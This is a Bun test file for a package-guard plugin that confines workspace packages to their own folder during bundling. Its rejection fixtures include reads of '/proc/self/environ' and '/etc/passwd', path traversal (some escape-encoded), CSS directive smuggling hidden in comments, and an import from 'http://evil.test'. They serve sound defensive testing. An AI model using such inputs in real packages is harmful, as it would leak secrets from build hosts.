import { afterAll, expect, test } from 'bun:test'
import { mkdirSync, mkdtempSync, realpathSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { bundleInputProblems, packageCodeProblems, packageCssProblems, packageGuardPlugin, packagesRoot } from './package-guard'

const root = realpathSync(mkdtempSync(join(tmpdir(), 'package-guard-')))
afterAll(() => rmSync(root, { recursive: true, force: true }))
const workspaces = join(root, 'workspaces')
const nm = join(workspaces, 'acme', '.miso', 'node_modules')
const file = join(nm, 'pkg', 'index.js')

function put(files: Record<string, string>) {
  for (const [path, text] of Object.entries(files)) {
    mkdirSync(join(path, '..'), { recursive: true })
    writeFileSync(path, text)
  }
}

test("a file's packages folder", () => {
  expect(packagesRoot(file)).toBe(nm)
  expect(packagesRoot(join(workspaces, 'acme', '.miso', 'views', 'x.ts'))).toBeNull()
  expect(packagesRoot(join(root, 'node_modules', 'react', 'index.js'))).toBeNull()
})

test("package code: paths stay in the space's packages, no attributes but json, no schemes", () => {
  const ok = [
    `import a from './a.js'; export * from '../other/b.js'; import c from 'other'; import fs from 'node:fs'; import { Database } from 'bun:sqlite'`,
    `const x = require('./x'); const y = require(name); import(variable); import('./lazy.js')`,
    `import data from './data.json' with { type: 'json' }; import('./d.json', { with: { type: 'json' } })`,
    `module.exports = function () { return 1 }`
  ]
  for (const source of ok) expect(packageCodeProblems(file, source, nm)).toEqual([])
  const bad: [string, string][] = [
    [`import t from '/proc/self/environ' with { type: 'text' }`, 'outside'],
    [`import t from '/etc/hosts'`, 'outside'],
    [`import t from '../../../views/secret.ts'`, 'outside'],
    [`const t = require('../../../../../../etc/passwd')`, 'outside'],
    [`require.resolve('../../../../x')`, 'outside'],
    [`import { x } from './m.ts' with { type: 'macro' }`, "other than { type: 'json' }"],
    [`import t from './a.txt' with { type: 'text' }`, "other than { type: 'json' }"],
    [`import { x } from 'macro:./m.ts'`, 'scheme'],
    [`import('./m.ts', { with: { type: 'macro' } })`, 'import() options'],
    [`export { x } from 'file:///etc/passwd'`, 'scheme'],
    [`import x from 'http://evil.test/x.js'`, 'scheme'],
    [`const = ;`, "doesn't parse"],
    [`import x from 'evil/../../../../secret.txt'`, 'step out'],
    [`import * as h from './p.html'`, 'HTML'],
    [`/** @jsxImportSource ../../.. */ export const a = 1`, 'JSX pragma']
  ]
  for (const [source, word] of bad) expect(packageCodeProblems(file, source, nm).join(' ')).toContain(word)
})

test("package stylesheets: plain CSS only, files only from the packages, no escapes", () => {
  const css = join(nm, 'pkg', 'style.css')
  expect(packageCssProblems(css, `@media (min-width: 1px) { .a { background: url(./i.png) } } @font-face { src: url("f.woff2") } .b { background: url("data:image/png;base64,AA") } .c { background: url(https://x.test/a.png) } .d { fill: url(#g) } @keyframes k { from { opacity: 0 } } /* taken from \\r@@t */ .e::after { content: "@plugin" }`, nm)).toEqual([])
  expect(packageCssProblems(css, '.a { content: "x }', nm).join(' ')).toContain('unclosed')
  for (const [source, word] of [
    ['@plugin "./p.js";', '@plugin'],
    ['@config "../../tailwind.config.js";', 'plain CSS at-rules'],
    ['@source "/";', 'plain CSS at-rules'],
    ['@reference "./x.css";', 'plain CSS at-rules'],
    ['@import "./b.css";', 'plain CSS at-rules'],
    ['@import"../x.css";', 'plain CSS at-rules'],
    ['@\\70lugin "./p.js";', 'plain CSS at-rules'],
    ['.h{content:"/*"} @plugin "./p2.js"; .k{content:"*/"}', 'plain CSS at-rules'],
    ['/* hidden */@plugin "./p.js";', 'plain CSS at-rules'],
    ['.a { background: url(/proc/self/environ) }', 'only files inside'],
    ['.a { background: url(../../../../x.png) }', 'only files inside'],
    ['.a { background: url(\\2e\\2e/\\2e\\2e/x.png) }', 'escapes'],
    ['.a { background: url("\\2e\\2e/x.png") }', 'escapes'],
    ['.a { background: image-set("../../../../x.png" 1x) }', 'only files inside'],
    ['.a { background: url(file:///etc/passwd) }', 'only its own files']
  ] as const) {
    expect(packageCssProblems(css, source, nm).join(' ')).toContain(word)
  }
})

test("the bundle's metafile: nothing read outside the app, and packages pull in only their own files", () => {
  const app = join(root, 'app')
  const fileIn = (p: string) => join(app, p)
  const ok = { inputs: { [fileIn('workspaces/acme/.miso/views/v.tsx')]: { imports: [{ path: fileIn('workspaces/acme/.miso/node_modules/p/i.js') }] }, [fileIn('workspaces/acme/.miso/node_modules/p/i.js')]: { imports: [{ path: fileIn('node_modules/react/index.js') }, { path: './a.png', kind: 'url-token' }, { path: 'https://x.test/a.js', external: true }] }, 'miso-runtime:acme': {} } }
  expect(bundleInputProblems(ok, { root: app, cwd: app })).toEqual([])
  const bad = { inputs: {
    'workspaces/acme/.miso/node_modules/p/i.js': { imports: [{ path: fileIn('workspaces/other/.miso/views/secret.tsx'), kind: 'require-call' }] },
    'workspaces/acme/.miso/node_modules/p/s.css': { imports: [{ path: '../../../../other/.miso/s.png', kind: 'url-token' }] },
    '/proc/self/environ': {},
    'workspaces/.git/config': {}
  } }
  const problems = bundleInputProblems(bad, { root: app, cwd: app }).join('\n')
  expect(problems).toContain('pulled ' + fileIn('workspaces/other/.miso/views/secret.tsx'))
  expect(problems).toContain('pulled ../../../../other/.miso/s.png')
  expect(problems).toContain('/proc/self/environ: the build read a file outside the app')
  expect(problems).toContain('workspaces/.git/config: the build read a file outside the app')
})

test('the build refuses a package that reads a file outside, and builds one that stays in', async () => {
  put({
    [join(workspaces, 'acme', '.miso', 'views', 'home.tsx')]: `import { v } from 'good'\nimport { s } from 'evil'\nexport default () => v + s\n`,
    [join(nm, 'good', 'package.json')]: JSON.stringify({ name: 'good', main: './index.js' }),
    [join(nm, 'good', 'index.js')]: `export { v } from './lib/v.js'`,
    [join(nm, 'good', 'lib', 'v.js')]: `export const v = 'good-value'`,
    [join(nm, 'evil', 'package.json')]: JSON.stringify({ name: 'evil', main: './index.js' }),
    [join(nm, 'evil', 'index.js')]: `import t from '/etc/hosts' with { type: 'text' }\nexport const s = t`
  })
  const entry = join(workspaces, 'acme', '.miso', 'views', 'home.tsx')
  const refused = await Bun.build({ entrypoints: [entry], target: 'browser', plugins: [packageGuardPlugin(workspaces)], throw: false })
  expect(refused.success).toBe(false)
  expect(refused.logs.map(l => l.message).join('\n')).toContain('outside the space')

  writeFileSync(join(nm, 'evil', 'index.js'), `export const s = 'fine'`)
  const built = await Bun.build({ entrypoints: [entry], target: 'browser', plugins: [packageGuardPlugin(workspaces)], throw: false })
  expect(built.success).toBe(true)
  expect(await built.outputs[0]!.text()).toContain('good-value')
})

test("the metafile catches a path the bundler worked out itself (a folded require)", async () => {
  const ws = join(root, 'mf', 'workspaces')
  put({
    [join(ws, 'b', '.miso', 'secret.txt')]: 'OTHER_SPACE_SECRET',
    [join(ws, 'a', '.miso', 'views', 'v.tsx')]: `import { t } from 'folded'\nexport default () => t\n`,
    [join(ws, 'a', '.miso', 'node_modules', 'folded', 'package.json')]: JSON.stringify({ name: 'folded', main: './i.js' }),
    [join(ws, 'a', '.miso', 'node_modules', 'folded', 'i.js')]: `export const t = require('../../../../b/.miso/' + 'secret.txt')\n`
  })
  const result = await Bun.build({ entrypoints: [join(ws, 'a', '.miso', 'views', 'v.tsx')], target: 'browser', plugins: [packageGuardPlugin(ws)], metafile: true, throw: false })
  const metafile = (result as unknown as { metafile: Parameters<typeof bundleInputProblems>[0] }).metafile
  expect(bundleInputProblems(metafile, { root: join(root, 'mf'), cwd: process.cwd() }).join('\n')).toContain("outside the space's packages")
})
